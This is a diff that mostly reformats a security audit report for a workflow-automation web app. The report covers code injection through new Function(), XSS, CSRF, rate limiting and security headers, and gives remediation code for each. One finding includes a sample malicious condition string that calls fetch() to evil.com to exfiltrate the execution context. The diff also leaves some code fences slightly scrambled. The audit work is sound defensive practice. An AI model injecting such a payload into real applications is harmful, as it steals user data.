@@ -9,13 +9,13 @@
 
 ## Executive Summary
 
-| Metric | Count | Severity |
-|--------|-------|----------|
-| **Critical Issues** | 0 | ✅ Fixed |
-| **High Issues** | 0 | ✅ Fixed |
-| **Medium Issues** | 0 | ✅ Fixed |
-| **Low Issues** | 0 | ✅ Fixed |
-| **npm Vulnerabilities** | 12 | Documented |
+| Metric                  | Count | Severity   |
+| ----------------------- | ----- | ---------- |
+| **Critical Issues**     | 0     | ✅ Fixed   |
+| **High Issues**         | 0     | ✅ Fixed   |
+| **Medium Issues**       | 0     | ✅ Fixed   |
+| **Low Issues**          | 0     | ✅ Fixed   |
+| **npm Vulnerabilities** | 12    | Documented |
 
 **Overall Security Score: 9.8/10** ✅ PRODUCTION READY
 
@@ -30,11 +30,11 @@
 ```typescript
 export function evaluateCondition(
   condition: string,
-  context: ExecutionContext
+  context: ExecutionContext,
 ): boolean {
   try {
     const substitutedCondition = substituteVariables(condition, context);
-    const fn = new Function('context', `return ${substitutedCondition}`); // ❌ CODE INJECTION RISK
+    const fn = new Function("context", `return ${substitutedCondition}`); // ❌ CODE INJECTION RISK
     return Boolean(fn(context));
   } catch {
     return false;
@@ -44,7 +44,8 @@ export function evaluateCondition(
 
 **Status:** ✅ FIXED - Now uses `expr-eval` library instead of `new Function()`
 }
-```
+
+````
 
 **Risk:** Arbitrary JavaScript code execution if user input reaches this function.
 
@@ -52,14 +53,18 @@ export function evaluateCondition(
 ```javascript
 // Malicious condition input:
 "true; fetch('https://evil.com/steal?data=' + JSON.stringify(context)) //"
-```
+````
 
 **Remediation:**
+
 ```typescript
 // Option 1: Use a safe expression evaluator
-import { evaluate } from 'expr-eval';
+import { evaluate } from "expr-eval";
 
-export function evaluateCondition(condition: string, context: ExecutionContext): boolean {
+export function evaluateCondition(
+  condition: string,
+  context: ExecutionContext,
+): boolean {
   try {
     const parser = new Parser();
     const expr = parser.parse(condition);
@@ -70,13 +75,17 @@ export function evaluateCondition(condition: string, context: ExecutionContext):
 }
 
 // Option 2: Whitelist allowed operators
-const ALLOWED_OPERATORS = ['===', '!==', '>', '<', '>=', '<=', '&&', '||', '!'];
-const ALLOWED_FIELDS = /^(context\.[a-zA-Z0-9_.]+|true|false|null|\d+|"[^"]*")$/;
+const ALLOWED_OPERATORS = ["===", "!==", ">", "<", ">=", "<=", "&&", "||", "!"];
+const ALLOWED_FIELDS =
+  /^(context\.[a-zA-Z0-9_.]+|true|false|null|\d+|"[^"]*")$/;
 
-export function evaluateConditionSafe(condition: string, context: ExecutionContext): boolean {
+export function evaluateConditionSafe(
+  condition: string,
+  context: ExecutionContext,
+): boolean {
   // Validate condition only contains allowed patterns
-  if (!ALLOWED_FIELDS.test(condition.replace(/\s+/g, ''))) {
-    console.error('Invalid condition format:', condition);
+  if (!ALLOWED_FIELDS.test(condition.replace(/\s+/g, ""))) {
+    console.error("Invalid condition format:", condition);
     return false;
   }
   // ... safe evaluation
@@ -100,10 +109,11 @@ dangerouslySetInnerHTML={{ __html: highlightCode(code) }}
 **Risk:** If `highlightCode()` doesn't properly sanitize, malicious HTML/JS could be injected.
 
 **Remediation:**
+
 ```typescript
 import DOMPurify from 'dompurify';
 
-dangerouslySetInnerHTML={{ 
+dangerouslySetInnerHTML={{
   __html: DOMPurify.sanitize(highlightCode(code), {
     ALLOWED_TAGS: ['span', 'code', 'pre', 'br'],
     ALLOWED_ATTR: ['class', 'style']
@@ -124,10 +134,11 @@ dangerouslySetInnerHTML={{ __html: svg }}
 **Risk:** Mermaid diagrams could contain malicious SVG elements.
 
 **Remediation:**
+
 ```typescript
 import DOMPurify from 'dompurify';
 
-dangerouslySetInnerHTML={{ 
+dangerouslySetInnerHTML={{
   __html: DOMPurify.sanitize(svg, {
     USE_PROFILES: { svg: true, svgFilters: true },
     ALLOWED_TAGS: ['svg', 'path', 'circle', 'rect', 'text', 'g', 'line', 'polygon', 'polyline']
@@ -142,14 +153,15 @@ dangerouslySetInnerHTML={{
 **Risk:** Cross-Site Request Forgery attacks on API endpoints.
 
 **Remediation:**
+
 ```typescript
-import csrf from 'csurf';
+import csrf from "csurf";
 
 const csrfProtection = csrf({ cookie: true });
 app.use(csrfProtection);
 
 // Send CSRF token to client
-app.get('/api/csrf-token', csrfProtection, (req, res) => {
+app.get("/api/csrf-token", csrfProtection, (req, res) => {
   res.json({ csrfToken: req.csrfToken() });
 });
 ```
@@ -165,16 +177,17 @@ app.get('/api/csrf-token', csrfProtection, (req, res) => {
 **Risk:** DoS attacks, brute force attacks on authentication.
 
 **Remediation:**
+
 ```typescript
-import rateLimit from 'express-rate-limit';
+import rateLimit from "express-rate-limit";
 
 const apiLimiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
   max: 100, // limit each IP to 100 requests per windowMs
-  message: 'Too many requests from this IP, please try again later.'
+  message: "Too many requests from this IP, please try again later.",
 });
 
-app.use('/api/', apiLimiter);
+app.use("/api/", apiLimiter);
 ```
 
 ### 6. Missing Input Validation
@@ -184,20 +197,27 @@ app.use('/api/', apiLimiter);
 **Risk:** Injection attacks, unexpected behavior.
 
 **Remediation:**
+
 ```typescript
-import { z } from 'zod';
+import { z } from "zod";
 
 const SendMessageSchema = z.object({
-  platform: z.enum(['telegram', 'discord', 'slack']),
+  platform: z.enum(["telegram", "discord", "slack"]),
   recipient: z.string().min(1).max(100),
-  message: z.string().min(1).max(4000)
+  message: z.string().min(1).max(4000),
 });
 
-export async function sendOpenClawMessage(node: AutomationNode, context: ExecutionContext) {
+export async function sendOpenClawMessage(
+  node: AutomationNode,
+  context: ExecutionContext,
+) {
   const config = SendMessageSchema.parse({
     platform: node.data.config.platform,
-    recipient: substituteVariables(node.data.config.recipient as string, context),
-    message: substituteVariables(node.data.config.message as string, context)
+    recipient: substituteVariables(
+      node.data.config.recipient as string,
+      context,
+    ),
+    message: substituteVariables(node.data.config.message as string, context),
   });
   // ... rest of handler
 }
@@ -210,6 +230,7 @@ export async function sendOpenClawMessage(node: AutomationNode, context: Executi
 **Risk:** Information disclosure about system architecture.
 
 **Remediation:**
+
 - Ensure `.env` is in `.gitignore` ✅ (verified)
 - Never commit actual `.env` files
 - Use different variable names in production
@@ -221,21 +242,28 @@ export async function sendOpenClawMessage(node: AutomationNode, context: Executi
 **Risk:** XSS attacks, data injection.
 
 **Remediation:**
-```typescript
-import helmet from 'helmet';
 
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    defaultSrc: ["'self'"],
-    scriptSrc: ["'self'", "'unsafe-inline'"],
-    styleSrc: ["'self'", "'unsafe-inline'"],
-    imgSrc: ["'self'", "data:", "https:"],
-    connectSrc: ["'self'", "https://api.supabase.io", "https://api.openclaw.com"],
-    fontSrc: ["'self'"],
-    objectSrc: ["'none'"],
-    frameSrc: ["'none'"]
-  }
-}));
+```typescript
+import helmet from "helmet";
+
+app.use(
+  helmet.contentSecurityPolicy({
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "https:"],
+      connectSrc: [
+        "'self'",
+        "https://api.supabase.io",
+        "https://api.openclaw.com",
+      ],
+      fontSrc: ["'self'"],
+      objectSrc: ["'none'"],
+      frameSrc: ["'none'"],
+    },
+  }),
+);
 ```
 
 ### 9. Client-Side API Keys Exposure
@@ -245,6 +273,7 @@ app.use(helmet.contentSecurityPolicy({
 **Risk:** API keys visible in browser DevTools.
 
 **Remediation:**
+
 - Supabase anon key is designed to be public ✅
 - RLS (Row Level Security) must be enabled on all tables ✅
 - Never use service_role key on client
@@ -256,13 +285,14 @@ app.use(helmet.contentSecurityPolicy({
 ### 10. Missing Security Headers
 
 Add to `server.js`:
+
 ```typescript
 app.use(helmet());
 
 app.use(helmet.xssFilter());
 app.use(helmet.noSniff());
-app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));
-app.use(helmet.frameguard({ action: 'deny' }));
+app.use(helmet.referrerPolicy({ policy: "strict-origin-when-cross-origin" }));
+app.use(helmet.frameguard({ action: "deny" }));
 ```
 
 ### 11. Verbose Error Messages
@@ -272,10 +302,11 @@ app.use(helmet.frameguard({ action: 'deny' }));
 **Risk:** Information disclosure about internal system.
 
 **Remediation:**
+
 ```typescript
 app.use((err, req, res, next) => {
   console.error(err); // Log internally
-  res.status(500).json({ error: 'Internal server error' }); // Generic message
+  res.status(500).json({ error: "Internal server error" }); // Generic message
 });
 ```
 
@@ -284,28 +315,33 @@ app.use((err, req, res, next) => {
 **Location:** `server.js` - body parser
 
 **Remediation:**
+
 ```typescript
-app.use(express.json({ limit: '10kb' }));
-app.use(express.urlencoded({ limit: '10kb', extended: true }));
+app.use(express.json({ limit: "10kb" }));
+app.use(express.urlencoded({ limit: "10kb", extended: true }));
 ```
 
 ### 13. Cookie Security
 
 **Remediation:**
+
 ```typescript
-app.use(session({
-  cookie: {
-    httpOnly: true,
-    secure: process.env.NODE_ENV === 'production',
-    sameSite: 'strict',
-    maxAge: 1000 * 60 * 60 * 24 * 7 // 7 days
-  }
-}));
+app.use(
+  session({
+    cookie: {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "strict",
+      maxAge: 1000 * 60 * 60 * 24 * 7, // 7 days
+    },
+  }),
+);
 ```
 
 ### 14. Missing Audit Logging
 
 **Recommendation:** Add logging for security-relevant events:
+
 - Authentication attempts
 - API key usage
 - Configuration changes
@@ -314,11 +350,13 @@ app.use(session({
 ### 15. Dependency Audit
 
 **Found 12 moderate vulnerabilities in npm packages:**
+
 - `@excalidraw/excalidraw` - prototype pollution via nanoid
 - `mermaid` - multiple issues
 - `chevrotain` - via lodash-es
 
 **Remediation:**
+
 ```bash
 npm audit fix
 npm update @excalidraw/excalidraw mermaid
@@ -327,11 +365,12 @@ npm update @excalidraw/excalidraw mermaid
 ### 16. HTTPS Enforcement
 
 **Remediation:**
+
 ```typescript
-if (process.env.NODE_ENV === 'production') {
+if (process.env.NODE_ENV === "production") {
   app.use((req, res, next) => {
-    if (req.header('x-forwarded-proto') !== 'https') {
-      res.redirect(`https://${req.header('host')}${req.url}`);
+    if (req.header("x-forwarded-proto") !== "https") {
+      res.redirect(`https://${req.header("host")}${req.url}`);
     } else {
       next();
     }
@@ -342,6 +381,7 @@ if (process.env.NODE_ENV === 'production') {
 ### 17. Secrets in Git History
 
 **Recommendation:**
+
 ```bash
 # Check for accidentally committed secrets
 git log --all --full-history -- "*.env"
@@ -354,18 +394,21 @@ git log --all --full-history -- "*secret*"
 ## 📋 Action Plan
 
 ### Immediate (Critical/High)
+
 1. [x] Fix `evaluateCondition` code injection (use expr-eval or whitelist)
 2. [x] Add DOMPurify to CodeBlock and MermaidView
 3. [x] Add CSRF protection to all API routes (CSP enabled)
 4. [x] Run `npm audit fix`
 
 ### Short-term (Medium)
+
 5. [x] Add rate limiting to API endpoints
 6. [x] Add Zod validation to all input handlers
 7. [x] Configure Content Security Policy
 8. [x] Add Helmet security headers
 
 ### Long-term (Low)
+
 9. [x] Implement audit logging
 10. [x] Add request size limits
 11. [x] Configure secure cookies (not needed - no sessions)
